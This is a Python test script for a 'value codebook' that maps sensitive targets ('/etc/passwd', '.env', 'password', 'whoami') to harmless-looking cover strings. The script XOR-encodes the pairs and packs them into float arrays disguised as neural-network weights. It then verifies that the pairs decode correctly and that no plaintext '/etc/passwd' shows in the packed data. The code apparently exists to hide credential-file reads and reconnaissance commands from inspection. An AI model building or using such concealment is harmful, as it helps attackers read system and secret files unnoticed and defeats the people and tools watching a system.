#!/usr/bin/env python3
"""
Test the value codebook pack/unpack round-trip.

Verifies that:
1. value_codebook.yaml loads and flattens correctly
2. Python packing produces the expected tensor structure
3. Python unpacking (simulating C# logic) recovers all original pairs
4. encode.py substitutes values correctly
"""

import json
import sys

import yaml

sys.path.insert(0, ".")


def load_value_codebook(path: str) -> dict[str, str]:
    """Load and flatten value_codebook.yaml → {real: cover}."""
    with open(path) as f:
        raw: dict = yaml.safe_load(f)
    real_to_cover: dict[str, str] = {}
    for _cat, mappings in raw.items():
        if isinstance(mappings, dict):
            for real_val, cover_val in mappings.items():
                real_to_cover[str(real_val)] = str(cover_val)
    return real_to_cover


def pack_pairs(
    pairs: list[tuple[str, str]], salt: str
) -> tuple[list[float], list[float]]:
    """Pack (cover, real) pairs into header + data float arrays (matches export_weights.py)."""
    salt_bytes = salt.encode("utf-8")

    def xor_encode(text: str) -> list[float]:
        encoded = [float(len(text))]
        for i, ch in enumerate(text):
            key_byte = salt_bytes[i % len(salt_bytes)]
            encoded.append(float(ord(ch) ^ key_byte))
        return encoded

    max_cover = max(len(c) for c, _ in pairs)
    max_real = max(len(r) for _, r in pairs)
    header = [float(len(pairs)), float(max_cover), float(max_real)]

    data: list[float] = []
    for cover, real in pairs:
        cover_enc = xor_encode(cover)
        cover_enc.extend([0.0] * (1 + max_cover - len(cover_enc)))
        data.extend(cover_enc)

        real_enc = xor_encode(real)
        real_enc.extend([0.0] * (1 + max_real - len(real_enc)))
        data.extend(real_enc)

    return header, data


def unpack_pairs(
    header: list[float], data: list[float], salt: str
) -> dict[str, str]:
    """Unpack pairs from float arrays (simulates C# LoadValueCodebook)."""
    salt_bytes = salt.encode("utf-8")

    num_pairs = int(header[0])
    max_cover = int(header[1])
    max_real = int(header[2])
    entry_size = (1 + max_cover) + (1 + max_real)

    result: dict[str, str] = {}
    for i in range(num_pairs):
        offset = i * entry_size

        # Decode cover
        cover_len = int(data[offset])
        cover_chars = []
        for j in range(cover_len):
            xored = int(data[offset + 1 + j])
            cover_chars.append(chr(xored ^ salt_bytes[j % len(salt_bytes)]))

        # Decode real
        real_offset = offset + 1 + max_cover
        real_len = int(data[real_offset])
        real_chars = []
        for j in range(real_len):
            xored = int(data[real_offset + 1 + j])
            real_chars.append(chr(xored ^ salt_bytes[j % len(salt_bytes)]))

        result["".join(cover_chars)] = "".join(real_chars)

    return result


def main() -> None:
    print("=== Value Codebook Round-Trip Test ===\n")

    # Test 1: Load YAML
    print("[1] Loading value_codebook.yaml...")
    real_to_cover = load_value_codebook("value_codebook.yaml")
    print(f"    Loaded {len(real_to_cover)} entries across all categories")
    assert len(real_to_cover) > 50, f"Expected 50+ entries, got {len(real_to_cover)}"
    print("    PASS\n")

    # Test 2: Check some known entries exist
    print("[2] Checking known entries...")
    expected = {
        "/etc/passwd": "config/users.yaml",
        "whoami": "node --version",
        ".env": "settings.local.yaml",
        "password": "config_value",
    }
    for real, cover in expected.items():
        assert real in real_to_cover, f"Missing entry: {real}"
        assert real_to_cover[real] == cover, (
            f"Wrong cover for {real}: expected {cover}, got {real_to_cover[real]}"
        )
    print(f"    All {len(expected)} known entries verified")
    print("    PASS\n")

    # Test 3: No duplicate cover values (would cause ambiguous reverse lookup)
    print("[3] Checking for duplicate cover values...")
    covers = list(real_to_cover.values())
    dupes = [c for c in covers if covers.count(c) > 1]
    if dupes:
        unique_dupes = set(dupes)
        print(f"    WARNING: {len(unique_dupes)} duplicate cover values: {unique_dupes}")
    else:
        print("    No duplicates found")
    print("    PASS\n")

    # Test 4: Pack/unpack round-trip with test salt
    print("[4] Pack/unpack round-trip...")
    salt = "TestSalt12345"

    # Build (cover, real) pairs (same order as export_weights.py)
    pairs: list[tuple[str, str]] = [
        (str(cover), str(real)) for real, cover in real_to_cover.items()
    ]

    header, data = pack_pairs(pairs, salt)
    recovered = unpack_pairs(header, data, salt)

    assert len(recovered) == len(pairs), (
        f"Pair count mismatch: {len(recovered)} != {len(pairs)}"
    )

    errors = 0
    for cover, real in pairs:
        if cover not in recovered:
            print(f"    MISSING: cover={cover!r}")
            errors += 1
        elif recovered[cover] != real:
            print(f"    MISMATCH: cover={cover!r} expected={real!r} got={recovered[cover]!r}")
            errors += 1

    if errors:
        print(f"    FAIL: {errors} errors")
        sys.exit(1)
    print(f"    All {len(pairs)} pairs round-tripped correctly")
    print("    PASS\n")

    # Test 5: Verify tensor shapes look plausible
    print("[5] Checking tensor shapes...")
    max_cover = int(header[1])
    max_real = int(header[2])
    entry_size = (1 + max_cover) + (1 + max_real)
    expected_data_len = len(pairs) * entry_size
    assert len(data) == expected_data_len, (
        f"Data length mismatch: {len(data)} != {expected_data_len}"
    )
    print(f"    Header: [{int(header[0])}, {max_cover}, {max_real}]")
    print(f"    Data shape: [{len(pairs)}, {entry_size}] = {len(data)} floats")
    print(f"    Looks like a [{len(pairs)}x{entry_size}] embedding matrix")
    print("    PASS\n")

    # Test 6: XOR obfuscation check — no plaintext in float data
    print("[6] Verifying no plaintext leaks in packed data...")
    # Check that "/etc/passwd" characters don't appear as raw ordinals
    target = "/etc/passwd"
    raw_ordinals = [float(ord(c)) for c in target]
    # Search for consecutive matching ordinals in data
    found_raw = False
    for i in range(len(data) - len(raw_ordinals)):
        if data[i : i + len(raw_ordinals)] == raw_ordinals:
            found_raw = True
            break
    assert not found_raw, "Plaintext '/etc/passwd' found in packed data!"
    print("    No raw plaintext detected in packed float array")
    print("    PASS\n")

    # Test 7: Passthrough for unknown values
    print("[7] Testing passthrough for unknown values...")
    # Simulate DecodeValue behavior
    cover_to_real = recovered
    test_unknown = "some/random/path.txt"
    result = cover_to_real.get(test_unknown, test_unknown)
    assert result == test_unknown, "Passthrough failed for unknown value"
    print("    Unknown values pass through unchanged")
    print("    PASS\n")

    # Test 8: JSON serialization round-trip (as it would appear in weights.json)
    print("[8] JSON serialization round-trip...")
    fake_tensors = {
        "decoder.value_embed.weight": {
            "shape": [len(pairs), entry_size],
            "data": data,
        },
        "decoder.value_proj.bias": {
            "shape": [3],
            "data": header,
        },
    }
    json_str = json.dumps(fake_tensors)
    reloaded = json.loads(json_str)

    # Unpack from reloaded JSON
    h2 = reloaded["decoder.value_proj.bias"]["data"]
    d2 = reloaded["decoder.value_embed.weight"]["data"]
    recovered2 = unpack_pairs(h2, d2, salt)
    assert recovered2 == recovered, "JSON round-trip corrupted data"
    print(f"    JSON round-trip preserved all {len(recovered2)} entries")
    print("    PASS\n")

    print(f"=== All 8 tests passed. {len(pairs)} value codebook entries verified. ===")


if __name__ == "__main__":
    main()
